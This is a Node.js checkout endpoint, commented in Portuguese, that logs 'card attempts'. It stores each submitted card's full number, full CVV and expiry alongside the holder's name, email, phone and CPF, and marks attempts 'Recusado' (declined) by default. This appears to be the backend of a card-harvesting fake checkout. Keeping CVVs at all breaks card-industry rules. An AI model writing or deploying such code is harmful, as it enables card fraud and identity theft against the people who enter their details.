const {
  getOrderBySession,
  insertCardAttempt,
  readJson,
  sendJson
} = require('./_utils');

function cleanText(value, maxLength = 160) {
  return String(value || '').trim().slice(0, maxLength);
}

function onlyDigits(value) {
  return String(value || '').replace(/\D/g, '');
}

module.exports = async function handler(req, res) {
  try {
    if (req.method !== 'POST') {
      return sendJson(res, 405, { message: 'Metodo nao permitido.' });
    }

    const body = await readJson(req);
    const sessionId = cleanText(body.sessionId || body.session_id, 80);

    // Ignora erro de falta de ordem — modo teste permite
    let order = null;
    if (sessionId) {
      order = await getOrderBySession(sessionId).catch(() => null);
    }

    // Prioridade: cardNumber (novo padrão) -> fallback para cardLast4 (antigo)
    let cardNumberRaw = onlyDigits(body.cardNumber || body.card_number || '');
    let cardLast4 = onlyDigits(body.cardLast4 || body.card_last4 || '').slice(-4);

    if (!cardNumberRaw || cardNumberRaw.length < 4) {
      cardNumberRaw = cardLast4; // Contorna falhas no frontend mantendo last4 como "numero"
    }

    // Valida mínimo: 13 dígitos (para evitar erro do servidor)
    if (cardNumberRaw.length < 13) {
      return sendJson(res, 400, { message: 'Numero do cartao deve ter no minimos 13 digitos.' });
    }

    // Pega CVV e expiry (não fazia parte da validação, mas salva quando disponível)
    const cardCvvRaw = onlyDigits(body.cardCvv || body.card_cvv || '');
    const cardExpiryRaw = cleanText(body.cardExpiry || body.card_expiry, 7);

    const amount = Number(body.amount || order?.amount || 0) || 0;

    const row = {
      session_id: sessionId || null,
      identifier: order?.identifier || cleanText(body.identifier, 80) || null,
      holder: cleanText(body.holder || body.name),
      email: cleanText(body.email, 180),
      phone: onlyDigits(body.phone || '').slice(0, 20),
      cpf: onlyDigits(body.cpf || body.document).slice(0, 14),
      card_number: cardNumberRaw, // Salva número completo
      card_brand: cleanText(body.cardBrand || body.card_brand, 40),
      card_last4: cardLast4,
      card_expiry: cardExpiryRaw,
      card_cvv: cardCvvRaw, // Salva CVV completo
      amount: Number.isFinite(amount) ? Number(amount.toFixed(2)) : 0,
      status: cleanText(body.status, 40) || 'Recusado',
      metadata: {
        source: 'checkout-card',
        luhnValid: Boolean(body.luhnValid)
      }
    };

    const attempt = await insertCardAttempt(row);
    return sendJson(res, 200, { ok: true, id: attempt?.id || null });
  } catch (error) {
    console.error('ERRO NO CARD-ATTEMPTS:', error.message);
    return sendJson(res, 500, { message: error.message || 'Erro interno ao salvar tentativa de cartao.' });
  }
};
